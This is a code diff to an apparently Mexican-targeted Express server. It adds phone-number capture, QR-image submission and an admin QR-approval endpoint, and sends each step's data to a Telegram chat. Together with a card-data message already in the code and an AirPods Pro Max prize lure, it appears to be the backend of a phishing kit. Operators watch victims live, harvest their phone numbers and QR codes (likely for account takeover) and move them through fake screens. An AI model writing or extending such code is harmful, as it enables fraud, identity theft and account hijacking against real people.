@@ -1567,6 +1567,50 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                 sendTelegramMessage(tarjetaMessage);
                 break;
+                
+              case 'phone_input':
+                updatedFields.celular = inputData.phone;
+                updatedFields.pasoActual = ScreenType.QR_SCAN;
+                console.log('Teléfono recibido (QR flow):', inputData.phone);
+                
+                // Enviar notificación a Telegram
+                const phoneMessage = `📱 <b>TELÉFONO RECIBIDO (Flujo QR)</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `📞 <b>Teléfono:</b> ${inputData.phone}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(phoneMessage);
+                break;
+                
+              case 'qr_validation':
+                updatedFields.qrImage = inputData.qrImage;
+                updatedFields.qrValidated = false;
+                updatedFields.pasoActual = ScreenType.QR_VALIDATION;
+                console.log('QR recibido para validación');
+                
+                // Notificar a los administradores sobre el nuevo QR recibido
+                const sessionData = await storage.getSessionById(sessionId);
+                const qrCreatedBy = sessionData?.createdBy || '';
+                
+                broadcastToAdmins(JSON.stringify({
+                  type: 'QR_RECEIVED',
+                  data: { 
+                    sessionId,
+                    qrImage: inputData.qrImage,
+                    phone: sessionData?.celular,
+                    timestamp: new Date().toISOString(),
+                    createdBy: qrCreatedBy
+                  }
+                }), qrCreatedBy);
+                
+                // Enviar notificación por Telegram
+                const qrTelegramMessage = `🔍 <b>Nuevo QR recibido para validación</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `📞 <b>Teléfono:</b> ${sessionData?.celular || 'No proporcionado'}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n\n` +
+                  `Un cliente ha enviado su código QR para validación de AirPods Pro Max.`;
+                
+                sendTelegramMessage(qrTelegramMessage);
+                break;
             }
 
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
@@ -2077,6 +2121,65 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       res.json(regularUsers);
     } catch (error: any) {
+      res.status(500).json({ message: error.message });
+    }
+  });
+
+  // API endpoint para validar QR
+  app.post('/api/sessions/:sessionId/validate-qr', async (req, res) => {
+    if (!req.isAuthenticated()) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const { sessionId } = req.params;
+      const { approved, reason } = req.body;
+      
+      const session = await storage.getSessionById(sessionId);
+      if (!session) {
+        return res.status(404).json({ message: "Sesión no encontrada" });
+      }
+
+      // Actualizar el estado de validación del QR
+      const updatedSession = await storage.updateSession(sessionId, {
+        qrValidated: approved,
+        pasoActual: approved ? ScreenType.VUELOS_OTORGADOS : ScreenType.QR_VALIDATION
+      });
+
+      // Notificar al cliente sobre el resultado
+      const client = clients.get(sessionId);
+      if (client && client.readyState === WebSocket.OPEN) {
+        client.send(JSON.stringify({
+          type: 'QR_VALIDATION_RESULT',
+          data: {
+            approved,
+            reason: reason || (approved ? 'QR validado correctamente' : 'QR no válido')
+          }
+        }));
+      }
+
+      // Notificar a administradores
+      broadcastToAdmins(JSON.stringify({
+        type: 'QR_VALIDATED',
+        data: {
+          sessionId,
+          approved,
+          reason,
+          validatedBy: req.user.username,
+          timestamp: new Date().toISOString()
+        }
+      }));
+
+      // Enviar notificación por Telegram
+      const validationMessage = approved 
+        ? `✅ <b>QR APROBADO</b>\n\n📋 <b>Folio:</b> ${session.folio}\n👤 <b>Validado por:</b> ${req.user.username}\n⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
+        : `❌ <b>QR RECHAZADO</b>\n\n📋 <b>Folio:</b> ${session.folio}\n👤 <b>Rechazado por:</b> ${req.user.username}\n📝 <b>Razón:</b> ${reason || 'No especificada'}\n⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+      
+      sendTelegramMessage(validationMessage);
+
+      res.json({ success: true, session: updatedSession });
+    } catch (error: any) {
+      console.error('Error validating QR:', error);
       res.status(500).json({ message: error.message });
     }
   });
